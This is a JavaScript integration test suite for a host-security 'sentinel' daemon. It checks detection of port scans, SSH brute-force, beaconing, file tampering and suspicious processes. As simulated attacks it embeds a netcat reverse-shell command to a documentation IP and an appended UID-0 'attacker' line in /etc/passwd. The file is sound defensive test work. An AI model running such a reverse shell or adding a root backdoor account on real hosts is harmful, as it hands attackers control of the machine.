import { describe, it, expect, beforeAll, afterAll, vi } from 'vitest';

// Real integration test: a real CommandCentre backend instance (the actual
// node-backend, imported directly and started on an ephemeral port) plus the
// real sentinel() daemon, talking over real HTTP — nothing here is mocked
// except the two things that genuinely can't run in a test environment: the
// real firewall (no root/iptables here) and the real /proc/net/tcp reads
// (this test host's actual network state, not a simulated scan).
process.env.NODE_ENV = 'test';
process.env.DATABASE_URL = 'sqlite://./sentinel-integration-test.db';
process.env.SECRET_KEY = 'test-secret-key-for-sentinel-integration-tests-only';
process.env.ASSET_CREDENTIAL_ENCRYPTION_KEY = 'test-only-encryption-key-not-for-production-use';
process.env.ADMIN_USERNAME = 'sentinel-test-admin';
process.env.ADMIN_PASSWORD = 'sentinel-test-password-123';
process.env.PORT = '0';

const { default: backendApp, ready: backendReady } = await import(
  '../../node-backend/src/app.js'
);
const { sequelize } = await import('../../node-backend/src/models/index.js');
const { runAsPlatformAdmin } = await import('../../node-backend/src/services/tenantContext.js');
const { sentinel } = await import('../src/index.js');

let backendServer;
let backendBaseUrl;
let apiBaseUrl;
let adminToken;
let assetId;

async function login() {
  const res = await fetch(`${apiBaseUrl}/token`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: process.env.ADMIN_USERNAME, password: process.env.ADMIN_PASSWORD }),
  });
  // The token now comes back only as an httpOnly cookie (see
  // node-backend/src/services/authCookie.js), not in the JSON body — pull
  // the raw JWT value back out so it can still be sent as a normal
  // Authorization header below (authMiddleware accepts either transport).
  const setCookie = typeof res.headers.getSetCookie === 'function'
    ? res.headers.getSetCookie()
    : [res.headers.get('set-cookie')].filter(Boolean);
  const authCookie = setCookie.find((line) => line.startsWith('access_token='));
  if (!authCookie) return null;
  return decodeURIComponent(authCookie.split(';')[0].split('=').slice(1).join('='));
}

async function api(path, { method = 'GET', body, key } = {}) {
  const res = await fetch(`${apiBaseUrl}${path}`, {
    method,
    headers: {
      'Content-Type': 'application/json',
      ...(adminToken ? { Authorization: `Bearer ${adminToken}` } : {}),
      ...(key ? { 'x-agent-key': key } : {}),
    },
    body: body !== undefined ? JSON.stringify(body) : undefined,
  });
  const data = await res.json().catch(() => null);
  return { status: res.status, body: data };
}

beforeAll(async () => {
  await backendReady;
  backendServer = backendApp.listen(0, '127.0.0.1');
  await new Promise((resolve) => backendServer.on('listening', resolve));
  const port = backendServer.address().port;
  backendBaseUrl = `http://127.0.0.1:${port}`;
  apiBaseUrl = `${backendBaseUrl}/api`;

  // Direct model access outside an HTTP request has no tenant context
  // established automatically — see node-backend's tenantContext.js.
  await runAsPlatformAdmin(async () => {
    const admin = await sequelize.models.User.findOne({ where: { name: process.env.ADMIN_USERNAME } });
    await admin.update({
      telegramNumber: '+27123456781',
      telegramChatId: '100000902',
      audienceCode: 'TJN',
      operationalTeams: ['Network'],
      department: 'Networks',
    });
  });
  adminToken = await login();

  const created = await api('/security/applications', {
    method: 'POST',
    body: { name: `router-${Date.now()}`, assetType: 'router', ipAddress: '10.0.0.1', environment: 'production' },
  });
  assetId = created.body.id;
});

afterAll(async () => {
  await new Promise((resolve) => backendServer.close(resolve));
});

describe('sentinel() against a real CommandCentre backend', () => {
  it('registers via heartbeat and reports its open-port inventory', async () => {
    const issued = await api(`/security/applications/${assetId}/sentinel-key`, { method: 'POST' });
    expect(issued.status).toBe(201);
    const sentinelKey = issued.body.sentinelKey;

    const instance = sentinel({
      assetId,
      sentinelKey,
      commandCentreUrl: apiBaseUrl,
      heartbeatIntervalMs: 100_000, // only the initial immediate run fires in this test
      commandPollIntervalMs: 100_000,
      scanCheckIntervalMs: 100_000,
      readOpenPorts: () => [22, 443],
      readConnections: () => [],
    });

    await new Promise((resolve) => setTimeout(resolve, 200));
    instance.stop();

    const status = await api(`/security/applications/${assetId}/enforcement-status`);
    expect(status.body.hasSentinelKey).toBe(true);
    expect(status.body.lastSentinelHeartbeatAt).not.toBeNull();
    expect(status.body.lastKnownOpenPorts).toEqual([22, 443]);
    expect(status.body.sentinelMode).toBe('shadow');
  });

  it('detects a simulated port scan, reports it, and does not touch the firewall in shadow mode', async () => {
    const issued = await api(`/security/applications/${assetId}/sentinel-key`, { method: 'POST' });
    const sentinelKey = issued.body.sentinelKey;
    const blockIp = vi.fn();

    // Simulate one remote IP hitting many distinct local ports — the exact
    // shape connectionTracker.js is designed to catch.
    const scannerConnections = Array.from({ length: 20 }, (_, i) => ({
      remoteIp: '203.0.113.50', remotePort: 55000, localIp: '10.0.0.1', localPort: 1000 + i, state: 'ESTABLISHED',
    }));

    const instance = sentinel({
      assetId,
      sentinelKey,
      commandCentreUrl: apiBaseUrl,
      heartbeatIntervalMs: 100_000,
      commandPollIntervalMs: 100_000,
      scanCheckIntervalMs: 100_000,
      firewall: { blockIp, unblockIp: vi.fn(), listBlockedIps: vi.fn() },
      readOpenPorts: () => [],
      readConnections: () => scannerConnections,
    });

    await new Promise((resolve) => setTimeout(resolve, 300));
    instance.stop();

    expect(blockIp).not.toHaveBeenCalled(); // shadow mode: report only

    const findings = await api('/security/findings?status=new');
    const scanFinding = findings.body.find((f) => f.category === 'port_scan' && f.affectedAssetRef === '10.0.0.1');
    expect(scanFinding).toBeTruthy();
    expect(scanFinding.requiresManualConfirmation).toBe(true);
  });

  it('promotes to active mode, then actually blocks a scanning IP via the injected firewall', async () => {
    const issued = await api(`/security/applications/${assetId}/sentinel-key`, { method: 'POST' });
    const sentinelKey = issued.body.sentinelKey;

    // A fresh key resets lastSentinelHeartbeatAt to null — need one real
    // heartbeat on record before /sentinel-mode will allow promotion.
    await api(`/security/applications/${assetId}/sentinel-heartbeat`, { method: 'POST', key: sentinelKey, body: {} });

    const promoted = await api(`/security/applications/${assetId}/sentinel-mode`, { method: 'PATCH', body: { mode: 'active' } });
    expect(promoted.status).toBe(200);
    expect(promoted.body.sentinelMode).toBe('active');

    const blockIp = vi.fn().mockResolvedValue(undefined);
    const scannerConnections = Array.from({ length: 20 }, (_, i) => ({
      remoteIp: '203.0.113.77', remotePort: 55000, localIp: '10.0.0.1', localPort: 2000 + i, state: 'ESTABLISHED',
    }));

    const instance = sentinel({
      assetId,
      sentinelKey,
      commandCentreUrl: apiBaseUrl,
      heartbeatIntervalMs: 100_000,
      commandPollIntervalMs: 100_000,
      scanCheckIntervalMs: 100_000,
      firewall: { blockIp, unblockIp: vi.fn(), listBlockedIps: vi.fn() },
      readOpenPorts: () => [],
      readConnections: () => scannerConnections,
    });

    await new Promise((resolve) => setTimeout(resolve, 300));
    instance.stop();

    expect(blockIp).toHaveBeenCalledWith('203.0.113.77');
  });

  it('detects an SSH brute-force pattern from real auth-log lines and blocks it once active', async () => {
    const issued = await api(`/security/applications/${assetId}/sentinel-key`, { method: 'POST' });
    const sentinelKey = issued.body.sentinelKey;
    await api(`/security/applications/${assetId}/sentinel-heartbeat`, { method: 'POST', key: sentinelKey, body: {} });
    await api(`/security/applications/${assetId}/sentinel-mode`, { method: 'PATCH', body: { mode: 'active' } });

    const bruteForceLines = Array.from(
      { length: 6 },
      (_, i) => `sshd[100${i}]: Failed password for invalid user admin from 203.0.113.201 port 5${i}000 ssh2`,
    );
    const blockIp = vi.fn().mockResolvedValue(undefined);

    const instance = sentinel({
      assetId,
      sentinelKey,
      commandCentreUrl: apiBaseUrl,
      heartbeatIntervalMs: 100_000,
      commandPollIntervalMs: 100_000,
      scanCheckIntervalMs: 100_000,
      authLogCheckIntervalMs: 100_000,
      authFailureThreshold: 5,
      firewall: { blockIp, unblockIp: vi.fn(), listBlockedIps: vi.fn() },
      readOpenPorts: () => [],
      readConnections: () => [],
      readAuthLines: () => Promise.resolve(bruteForceLines),
    });

    await new Promise((resolve) => setTimeout(resolve, 300));
    instance.stop();

    expect(blockIp).toHaveBeenCalledWith('203.0.113.201');

    // A real block (blocked: true) sets requiresManualConfirmation: false,
    // which auto-creates a ticket and moves the finding straight to
    // 'investigating' — it never sits in 'new' once it's already contained.
    const findings = await api('/security/findings?status=investigating');
    const bruteFinding = findings.body.find((f) => f.category === 'brute_force_ssh' && f.affectedAssetRef === '10.0.0.1');
    expect(bruteFinding).toBeTruthy();
  });

  it('flags a successful login that followed recent failed SSH attempts as a suspected compromise', async () => {
    const issued = await api(`/security/applications/${assetId}/sentinel-key`, { method: 'POST' });
    const sentinelKey = issued.body.sentinelKey;
    await api(`/security/applications/${assetId}/sentinel-heartbeat`, { method: 'POST', key: sentinelKey, body: {} });

    let poll = 0;
    const readAuthLines = () => {
      poll += 1;
      if (poll === 1) {
        return Promise.resolve([
          'sshd[1]: Failed password for root from 203.0.113.202 port 51001 ssh2',
          'sshd[2]: Failed password for root from 203.0.113.202 port 51002 ssh2',
        ]);
      }
      if (poll === 2) {
        return Promise.resolve(['sshd[3]: Accepted password for root from 203.0.113.202 port 51003 ssh2']);
      }
      return Promise.resolve([]);
    };

    const instance = sentinel({
      assetId,
      sentinelKey,
      commandCentreUrl: apiBaseUrl,
      heartbeatIntervalMs: 100_000,
      commandPollIntervalMs: 100_000,
      scanCheckIntervalMs: 100_000,
      authLogCheckIntervalMs: 100,
      authFailureThreshold: 10, // stays below brute-force threshold; only the compromise signal should fire
      firewall: { blockIp: vi.fn(), unblockIp: vi.fn(), listBlockedIps: vi.fn() },
      readOpenPorts: () => [],
      readConnections: () => [],
      readAuthLines,
    });

    await new Promise((resolve) => setTimeout(resolve, 400));
    instance.stop();

    const findings = await api('/security/findings?status=new');
    const compromiseFinding = findings.body.find(
      (f) => f.category === 'ssh_compromise_suspected' && f.affectedAssetRef === '10.0.0.1',
    );
    expect(compromiseFinding).toBeTruthy();
    expect(compromiseFinding.severity).toBe('critical');
  });

  it('detects outbound fan-out to many distinct destinations and reports it without blocking', async () => {
    const issued = await api(`/security/applications/${assetId}/sentinel-key`, { method: 'POST' });
    const sentinelKey = issued.body.sentinelKey;
    await api(`/security/applications/${assetId}/sentinel-heartbeat`, { method: 'POST', key: sentinelKey, body: {} });
    await api(`/security/applications/${assetId}/sentinel-mode`, { method: 'PATCH', body: { mode: 'active' } });

    const fanOutConnections = Array.from({ length: 30 }, (_, i) => ({
      remoteIp: `203.0.113.${i}`, remotePort: 443, localIp: '10.0.0.1', localPort: 54000 + i,
    }));

    const instance = sentinel({
      assetId,
      sentinelKey,
      commandCentreUrl: apiBaseUrl,
      heartbeatIntervalMs: 100_000,
      commandPollIntervalMs: 100_000,
      scanCheckIntervalMs: 100_000,
      authLogCheckIntervalMs: 100_000,
      outboundCheckIntervalMs: 100_000,
      firewall: { blockIp: vi.fn(), unblockIp: vi.fn(), listBlockedIps: vi.fn(), blockOutboundIp: vi.fn(), unblockOutboundIp: vi.fn() },
      readOpenPorts: () => [],
      readConnections: () => [],
      readAuthLines: () => Promise.resolve([]),
      readOutboundConnections: () => fanOutConnections,
    });

    await new Promise((resolve) => setTimeout(resolve, 300));
    instance.stop();

    const findings = await api('/security/findings?status=new');
    const fanOutFinding = findings.body.find((f) => f.category === 'outbound_fanout' && f.affectedAssetRef === '10.0.0.1');
    expect(fanOutFinding).toBeTruthy(); // report-only (requiresManualConfirmation stays true) even though mode is active
  });

  it('detects periodic outbound beaconing and isolates the destination once active', async () => {
    const issued = await api(`/security/applications/${assetId}/sentinel-key`, { method: 'POST' });
    const sentinelKey = issued.body.sentinelKey;
    await api(`/security/applications/${assetId}/sentinel-heartbeat`, { method: 'POST', key: sentinelKey, body: {} });
    await api(`/security/applications/${assetId}/sentinel-mode`, { method: 'PATCH', body: { mode: 'active' } });

    const blockOutboundIp = vi.fn().mockResolvedValue(undefined);
    let poll = 0;
    const beaconConn = { remoteIp: '198.51.100.66', remotePort: 8443, localIp: '10.0.0.1', localPort: 55000 };

    const instance = sentinel({
      assetId,
      sentinelKey,
      commandCentreUrl: apiBaseUrl,
      heartbeatIntervalMs: 100_000,
      commandPollIntervalMs: 100_000,
      scanCheckIntervalMs: 100_000,
      authLogCheckIntervalMs: 100_000,
      outboundCheckIntervalMs: 50,
      outboundWindowMs: 10 * 60_000,
      firewall: { blockIp: vi.fn(), unblockIp: vi.fn(), listBlockedIps: vi.fn(), blockOutboundIp, unblockOutboundIp: vi.fn() },
      readOpenPorts: () => [],
      readConnections: () => [],
      readAuthLines: () => Promise.resolve([]),
      // Every poll "sees" the same destination again — real regular check-in traffic.
      readOutboundConnections: () => { poll += 1; return poll <= 5 ? [beaconConn] : []; },
    });

    await new Promise((resolve) => setTimeout(resolve, 400));
    instance.stop();

    expect(blockOutboundIp).toHaveBeenCalledWith('198.51.100.66');

    const findings = await api('/security/findings?status=investigating');
    const beaconFinding = findings.body.find((f) => f.category === 'outbound_beaconing' && f.affectedAssetRef === '10.0.0.1');
    expect(beaconFinding).toBeTruthy();
  });

  it('detects a modified watched file and reports it as a file-integrity finding', async () => {
    const issued = await api(`/security/applications/${assetId}/sentinel-key`, { method: 'POST' });
    const sentinelKey = issued.body.sentinelKey;
    await api(`/security/applications/${assetId}/sentinel-heartbeat`, { method: 'POST', key: sentinelKey, body: {} });

    let content = 'root:x:0:0:root:/root:/bin/bash\n';
    const instance = sentinel({
      assetId,
      sentinelKey,
      commandCentreUrl: apiBaseUrl,
      heartbeatIntervalMs: 100_000,
      commandPollIntervalMs: 100_000,
      scanCheckIntervalMs: 100_000,
      authLogCheckIntervalMs: 100_000,
      outboundCheckIntervalMs: 100_000,
      fimCheckIntervalMs: 100,
      watchedPaths: ['/etc/passwd'],
      readWatchedFile: () => content,
      firewall: { blockIp: vi.fn(), unblockIp: vi.fn(), listBlockedIps: vi.fn(), blockOutboundIp: vi.fn(), unblockOutboundIp: vi.fn() },
      readOpenPorts: () => [],
      readConnections: () => [],
      readAuthLines: () => Promise.resolve([]),
      readOutboundConnections: () => [],
    });

    await new Promise((resolve) => setTimeout(resolve, 150)); // first tick: establishes baseline, no finding yet
    content = 'root:x:0:0:root:/root:/bin/bash\nattacker:x:0:0::/root:/bin/bash\n'; // a new UID-0 line appended
    await new Promise((resolve) => setTimeout(resolve, 250)); // second tick: should detect the change
    instance.stop();

    const findings = await api('/security/findings?status=new');
    const fimFinding = findings.body.find((f) => f.category === 'file_integrity_violation' && f.affectedAssetRef === '10.0.0.1');
    expect(fimFinding).toBeTruthy();
    expect(fimFinding.severity).toBe('high');
  });

  it('detects a new process matching a reverse-shell pattern and reports it', async () => {
    const issued = await api(`/security/applications/${assetId}/sentinel-key`, { method: 'POST' });
    const sentinelKey = issued.body.sentinelKey;
    await api(`/security/applications/${assetId}/sentinel-heartbeat`, { method: 'POST', key: sentinelKey, body: {} });

    const pidMap = { current: { 100: { cmdline: 'node server.js', exePath: '/usr/bin/node' } } };
    const processReaders = {
      readdir: () => Object.keys(pidMap.current),
      readFileText: (path) => {
        const pid = path.match(/\/proc\/(\d+)\/cmdline/)[1];
        return pidMap.current[pid].cmdline.split(' ').join('\0') + '\0';
      },
      readlink: (path) => {
        const pid = path.match(/\/proc\/(\d+)\/exe/)[1];
        if (!pidMap.current[pid].exePath) throw new Error('EACCES');
        return pidMap.current[pid].exePath;
      },
    };

    const instance = sentinel({
      assetId,
      sentinelKey,
      commandCentreUrl: apiBaseUrl,
      heartbeatIntervalMs: 100_000,
      commandPollIntervalMs: 100_000,
      scanCheckIntervalMs: 100_000,
      authLogCheckIntervalMs: 100_000,
      outboundCheckIntervalMs: 100_000,
      fimCheckIntervalMs: 100_000,
      processCheckIntervalMs: 100,
      processReaders,
      firewall: { blockIp: vi.fn(), unblockIp: vi.fn(), listBlockedIps: vi.fn(), blockOutboundIp: vi.fn(), unblockOutboundIp: vi.fn() },
      readOpenPorts: () => [],
      readConnections: () => [],
      readAuthLines: () => Promise.resolve([]),
      readOutboundConnections: () => [],
    });

    await new Promise((resolve) => setTimeout(resolve, 150)); // first tick: baseline only
    pidMap.current[666] = { cmdline: 'nc -e /bin/sh 203.0.113.5 4444' }; // simulated reverse shell spawn
    await new Promise((resolve) => setTimeout(resolve, 250));
    instance.stop();

    const findings = await api('/security/findings?status=new');
    const processFinding = findings.body.find((f) => f.category === 'suspicious_process' && f.affectedAssetRef === '10.0.0.1');
    expect(processFinding).toBeTruthy();
    expect(processFinding.severity).toBe('critical');
  });

  it('executes a manually-queued block_ip command from the operator UI via the real command-poll loop', async () => {
    const issued = await api(`/security/applications/${assetId}/sentinel-key`, { method: 'POST' });
    const sentinelKey = issued.body.sentinelKey;
    await api(`/security/applications/${assetId}/sentinel-heartbeat`, { method: 'POST', key: sentinelKey, body: {} });

    const queued = await api(`/security/applications/${assetId}/commands`, {
      method: 'POST',
      body: { action: 'block_ip', target: '198.51.100.99', reason: 'manual operator action' },
    });
    expect(queued.status).toBe(201);

    const blockIp = vi.fn().mockResolvedValue(undefined);
    const instance = sentinel({
      assetId,
      sentinelKey,
      commandCentreUrl: apiBaseUrl,
      heartbeatIntervalMs: 100_000,
      commandPollIntervalMs: 100, // fast poll so this test doesn't need to wait long
      scanCheckIntervalMs: 100_000,
      firewall: { blockIp, unblockIp: vi.fn(), listBlockedIps: vi.fn() },
      readOpenPorts: () => [],
      readConnections: () => [],
    });

    await new Promise((resolve) => setTimeout(resolve, 400));
    instance.stop();

    expect(blockIp).toHaveBeenCalledWith('198.51.100.99');

    const pending = await api(`/security/applications/${assetId}/commands/pending`, { key: sentinelKey });
    expect(pending.body).toEqual([]); // acked, no longer pending
  });
});
